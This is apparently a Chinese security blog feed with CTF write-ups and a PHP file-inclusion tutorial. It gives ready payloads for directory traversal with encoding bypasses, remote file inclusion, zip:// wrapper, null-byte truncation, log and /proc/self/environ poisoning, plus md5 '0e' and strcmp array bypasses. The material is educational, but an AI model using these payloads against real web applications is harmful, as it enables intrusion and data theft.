<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
<h3 id="包含fd"><a href="#包含fd" class="headerlink" title="包含fd"></a>包含fd</h3><p>与包含environ类似</p>
<h3 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h3><img src="/2019/11/22/文件包含漏洞/12.jpg">

<p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可</p>
<p>类似利用临时文件的存在，竞争时间去包含的，可以看：<a href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/" target="_blank" rel="noopener">XMAN夏令营-2017-babyweb-writeup</a></p>
<h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>平常碰到的情况肯定不会是简简单单的include $_GET[‘file’];这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file.<span class="string">'/test/test.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样就很“难”直接去包含前面提到的种种文件</p>
<h3 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> <span class="string">'/var/www/html/'</span>.$file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p><strong>./</strong>当前目录,<strong>../</strong>上一级目录,这样的遍历目录来读取文件</p>
<p>现在在/var/log/info.txt文件中有php代码 <?php phpinfo(); ?> ，则利用../可以进行目录遍历：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=../../<span class="built_in">log</span>/info.txt</span><br></pre></td></tr></table></figure>

<p>则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功</p>
<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>服务器端常常会对于<strong>../</strong>等做一些过滤，可以用一些编码来进行绕过。</p>
<p>一.利用url编码</p>
<pre><code>1.**../**
    1) %2e%2e%2f
    2) ..%2f
    3) %2e%2e/

2.**..\**
    1) %2e%2e%5c
    2) ..%5c
    3) %2e%2e\</code></pre><p>二.二次编码</p>
<pre><code>1.**../**
    1) %252e%252e%252f

2.**..\**
    1) %252e%252e%255c</code></pre><p>三.容器/服务器的编码方式</p>
<pre><code>1.**../**
    1) ..%c0%af
    2) %c0%ae%c0%ae/    (java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）)

2.**..\**
    1) ..%c1%9c</code></pre><h3 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>url格式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">protocol :// hostname[:port] / path / [;parameters][?query]<span class="comment">#fragment</span></span><br><span class="line"></span><br><span class="line">	1.protocol（协议）:指定使用的传输协议</span><br><span class="line">	2.hostname（主机名）:是指存放资源的服务器的域名系统（DNS）主机名或 IP 地址</span><br><span class="line">	3.:port（端口号）</span><br><span class="line">	4.path（路径）</span><br><span class="line">	5.;parameters（参数）</span><br><span class="line">	6.?query（查询）</span><br><span class="line">	7.fragment（信息片断）</span><br></pre></td></tr></table></figure>

<p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制</p>
<h5 id="query（-）"><a href="#query（-）" class="headerlink" title="query（?）"></a>query（?）</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include?file=http://remoteaddr/remoteinfo.txt?</span><br></pre></td></tr></table></figure>

<p>那么包含的文件就为<a href="http://remoteaddr/remoteinfo.txt?/test/test.php" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt?/test/test.php</a><br>问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过的</p>
<h5 id="fragment（-）"><a href="#fragment（-）" class="headerlink" title="fragment（#）"></a>fragment（#）</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=http://remoteaddr/remoteinfo.txt%23</span><br></pre></td></tr></table></figure>

<p>那么包含的文件为<a href="http://remoteaddr/remoteinfo.txt#/test/test.php" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt#/test/test.php</a><br>#后面的部分/test/test.php，也就是指定的后缀被当作fragment从而被绕过。（注意：需要把#进行url编码为%23）</p>
<h4 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h4><p>前面提到过利用zip协议和phar协议，现在假设测试代码为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span> $file.<span class="string">'/test/test.php'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造个压缩包，包内的test.php的内容为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用zip协议（注意要指定绝对路径）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=zip://D:/software/phpstudy/PHPTutorial/WWW/<span class="built_in">test</span>/chybeta.zip%23chybeta</span><br></pre></td></tr></table></figure>

<p>那么拼接后则为：zip://D:/software/phpstudy/PHPTutorial/WWW/test/chybeta.zip#chybeta/test/test.php</p>
<h4 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h4><p>利用条件：php版本 &lt; php 5.2.8</p>
<p>目录字符串，在Linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<strong>./</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=././././........././././shell.txt</span><br></pre></td></tr></table></figure>

<p>则后缀/test/test.php，在达到最大值后会被直接丢弃掉</p>
<h4 id="0字节截断"><a href="#0字节截断" class="headerlink" title="0字节截断"></a>0字节截断</h4><p>利用条件：php版本 &lt; php 5.3.4</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include.php?file=phpinfo.txt%00</span><br></pre></td></tr></table></figure>

<h2 id="防御手法"><a href="#防御手法" class="headerlink" title="防御手法"></a>防御手法</h2><pre><code>1.无需情况下设置allow_url_include和allow_url_fopen为关闭
2.在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败
3.做好文件的权限管理
4.对危险字符进行过滤等等
5.尽量不使用动态包含
6.</code></pre><h3 id="本地包含配合apache日志拿shell——条件：如果包含不成功-也许是open-basedir限制了目录？？？"><a href="#本地包含配合apache日志拿shell——条件：如果包含不成功-也许是open-basedir限制了目录？？？" class="headerlink" title="本地包含配合apache日志拿shell——条件：如果包含不成功,也许是open_basedir限制了目录？？？"></a>本地包含配合apache日志拿shell——条件：如果包含不成功,也许是open_basedir限制了目录？？？</h3><p>常见几个路径：<br>/var/log/apache/access_log<br>/var/www/logs/access_log<br>/var/log/access_log<br>更多见上面的路径收集</p>
<h3 id="利用-proc-self-environ进行包含"><a href="#利用-proc-self-environ进行包含" class="headerlink" title="利用/proc/self/environ进行包含"></a>利用/proc/self/environ进行包含</h3><h3 id="包含session文件"><a href="#包含session文件" class="headerlink" title="包含session文件"></a>包含session文件</h3><p>session文件一般在/tmp目录下，格式为sess_[phpsessid]</p>
<h3 id="包含其他由php创建的tmp文件"><a href="#包含其他由php创建的tmp文件" class="headerlink" title="包含其他由php创建的tmp文件"></a>包含其他由php创建的tmp文件</h3><p>上传一个文件的过程,可以在tmp那里包含<br>jpg<br>向服务器上任意php文件以form-data方式提交请求上传数据时，会生成临时文件,通过phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。</p>
<h3 id="jsp文件包含漏洞"><a href="#jsp文件包含漏洞" class="headerlink" title="jsp文件包含漏洞"></a>jsp文件包含漏洞</h3><h3 id="asp文件包含漏洞"><a href="#asp文件包含漏洞" class="headerlink" title="asp文件包含漏洞"></a>asp文件包含漏洞</h3><h3 id="aspx文件包含漏洞"><a href="#aspx文件包含漏洞" class="headerlink" title="aspx文件包含漏洞"></a>aspx文件包含漏洞</h3>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Bugku-never-give-up]]></title>
      <url>/2019/11/09/Bugku-never-give-up/</url>
      <content type="html"><![CDATA[<img src="/2019/11/09/Bugku-never-give-up/1.jpg">
<p>无任何提示，于是查看源码</p>
<img src="/2019/11/09/Bugku-never-give-up/1.jpg">
<p>发现了个1p.html，打开后直接跳转到bugku主页<br>想到可能是重定向跳转过去的<br>于是利用 <strong>view-source:<a href="http://123.206.87.240:8006/test/1p.html" target="_blank" rel="noopener">http://123.206.87.240:8006/test/1p.html</a></strong> 查看源码</p>
<img src="/2019/11/09/Bugku-never-give-up/3.jpg">

<p>由 var Words 中的值可知这为url编码解码后得</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=<span class="string">'http://www.bugku.com'</span>\;\&lt;/script\&gt; </span><br><span class="line">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--\&gt;</span><br></pre></td></tr></table></figure>

<p>发现是base64，将第一行去掉后解码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E</span><br></pre></td></tr></table></figure>

<p>再来一次url解码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: hello.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'no no no no no no no'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"bugku is a nice plateform!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"f4l2a3g.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"never never never give up !!!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="审计分析代码："><a href="#审计分析代码：" class="headerlink" title="审计分析代码："></a>审计分析代码：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第 1 行：限制 URL 查询字符串中必须有非空非零变量 id</span><br><span class="line">第 9 行：限制变量 <span class="variable">$a</span> 中不能含有字符 .</span><br><span class="line">第 15 行：要满足以下 5 条表达式才会爆 flag：</span><br><span class="line">	变量 <span class="variable">$data</span> 弱等于字符串 bugku is a nice plateform!</span><br><span class="line">	变量 <span class="variable">$id</span> 弱等于整型数 0</span><br><span class="line">	变量 <span class="variable">$b</span> 的长度大于 5</span><br><span class="line">	字符串 1114 要与字符串 111 连接变量 <span class="variable">$b</span> 的第一个字符构成的正则表达式匹配</span><br><span class="line">	变量 <span class="variable">$b</span> 的第一个字符弱不等于整型数 4</span><br></pre></td></tr></table></figure>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[strcmp与PHP处理0e开头md5时hash字符串漏洞]]></title>
      <url>/2019/11/09/strcmp%E4%B8%8EPHP%E5%A4%84%E7%90%860e%E5%BC%80%E5%A4%B4md5%E6%97%B6hash%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>审计代码可知：<br>我们需要以GET形式传递3个值，其中 v1 != v2 ，if中的第二个判断条件用的是 ==，我们可以利用 “0x” == “0a” 的判断结果为1，所以只找出经过加密后的两个md5值以0开头，接下去以都相同的值，直到遇到的字母的两个字符串相等 v3 == flag</p>
<h2 id="一、PHP处理0e开头md5时hash字符串漏洞"><a href="#一、PHP处理0e开头md5时hash字符串漏洞" class="headerlink" title="一、PHP处理0e开头md5时hash字符串漏洞"></a>一、PHP处理0e开头md5时hash字符串漏洞</h2><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。      例如：<strong>v1=s878926199a&amp;&amp;v2=s155964671a</strong></p>
<h2 id="二、md5函数特性"><a href="#二、md5函数特性" class="headerlink" title="二、md5函数特性"></a>二、md5函数特性</h2><p>根据md5函数特性，用两个值不同但不可进行md5的数据类型，如果使用一个不可md5的数据类型传入的话那么md5函数将返回false，这个也是返回值<br>例如： <strong>v1[]=1&amp;&amp;v2[]=2</strong></p>
<h2 id="三、strcmp"><a href="#三、strcmp" class="headerlink" title="三、strcmp()"></a>三、strcmp()</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int strcmp ( string <span class="variable">$str1</span> , string <span class="variable">$str2</span> )</span><br><span class="line">参数 str1第一个字符串。str2第二个字符串。</span><br><span class="line">如果 str1 小于 str2 返回 &lt; 0；</span><br><span class="line">如果 str1 大于 str2 返回 &gt; 0；</span><br><span class="line">如果两者相等，返回 0。</span><br></pre></td></tr></table></figure>

<p>传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $password=<span class="string">"***************"</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strcmp($_POST[<span class="string">'password'</span>], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Right!!!login success"</span>;n</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Wrong password.."</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>只要我们$_POST[‘password’]是一个数组或者一个object即可，但是上一个问题的时候说到过，只能上传字符串类型，那我们又该如何做呢<br>我们只需将payload构造成 <strong>password[]=admin</strong> 即可</p>
<p>所以该题的绕过方式为：<br>    <strong>?v1[]=1&amp;&amp;v2[]=2&amp;&amp;v3[]=3</strong><br>    <strong>?v1=s878926199a&amp;&amp;v2=s155964671a&amp;&amp;v3[]=1</strong>  都可</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Bugku-字符正则]]></title>
      <url>/2019/11/08/Bugku-%E5%AD%97%E7%AC%A6%E6%AD%A3%E5%88%99/</url>
      <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IM )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>审计代码后知道只要我们构造出符合正则表达式的字符串通过GET传参传过去就可以看到 key 即 flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">分析题目：</span><br><span class="line">定界符：/和/（一般来说是这两个，其实除了\和字母数字其它的只要是成对出现都可以看做定界符，比如<span class="comment">##、！！之类的）；</span></span><br><span class="line"></span><br><span class="line">. （一个点）：表示匹配除 <span class="string">"\n"</span> 之外的任何单个字符；</span><br><span class="line"></span><br><span class="line">*   ：匹配它前面的表达式0次或多次，等价于&#123;0,&#125;；</span><br><span class="line"></span><br><span class="line">&#123;n,m\&#125; ：最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符</span><br><span class="line"></span><br><span class="line">\\ （反斜线）：后面的字符被转义；</span><br><span class="line"></span><br><span class="line">[a-z] ：在a到z中匹配 ；</span><br><span class="line"></span><br><span class="line">[[:punct:]] ：匹配任何标点符号；</span><br><span class="line"></span><br><span class="line">/i  ：表示这个正则表达式对大小写不敏感；</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">key 	.	*	key		.	&#123;4,7&#125;	key:\/		\/		(	.	*	key		)	[a-z]	[[:punct:]]</span><br><span class="line">‘key’+任意单个字符+前面的字符重复零个或多个+‘key’+任意单个字符+长度4-7+‘key:/’+任意单个字符+ / +（任意单个字符+零个或多个+‘key’)+英文小写字母一个+匹配‘!<span class="string">"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~.’中一个字符</span></span><br></pre></td></tr></table></figure>

<p>分析完后便可以开始构造payload<br>keyaaaakeya1234key:/a/aaaakeya!</p>
<h2 id="正则表达式语法补充"><a href="#正则表达式语法补充" class="headerlink" title="正则表达式语法补充"></a>正则表达式语法补充</h2><h3 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h3><p> “\b” :不会消耗任何字符只匹配一个位置，常用于匹配单词边界 如 我想从字符串中”This is Regex”匹配单独的单词 “is” 正则就要写成 “\bis\b”  </p>
<p>　　  \b 不会匹配is 两边的字符，但它会识别is 两边是否为单词的边界 </p>
<p> “\d”: 匹配数字</p>
<p> “\w”：匹配字母，数字，下划线.</p>
<p> “\s”：匹配空格 </p>
<p>  “.”：匹配除了换行符以外的任何字符</p>
<p>  “[abc]”: 字符组  匹配包含括号内元素的字符 </p>
<p>另：</p>
<p>“\W”   匹配任意不是字母，数字，下划线 的字符</p>
<p>“\S”   匹配任意不是空白符的字符</p>
<p>“\D”  匹配任意非数字的字符</p>
<p>“\B”  匹配不是单词开头或结束的位置</p>
<p>“[^abc]”  匹配除了abc以外的任意字符</p>
<h3 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h3><table>
<thead>
<tr>
<th align="center">*</th>
<th align="center">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td align="center">匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
</tr>
<tr>
<td align="center">?</td>
<td align="center">匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 或 “does” 中的”do” 。? 等价于 {0,1}。</td>
</tr>
<tr>
<td align="center">{n}</td>
<td align="center">n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
</tr>
<tr>
<td align="center">{n,}</td>
<td align="center">n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
</tr>
<tr>
<td align="center">{n,m}</td>
<td align="center">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
</tr>
</tbody></table>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[BUUCTF-web-EasyCalc]]></title>
      <url>/2019/10/23/BUUCTF-web-EasyCalc/</url>
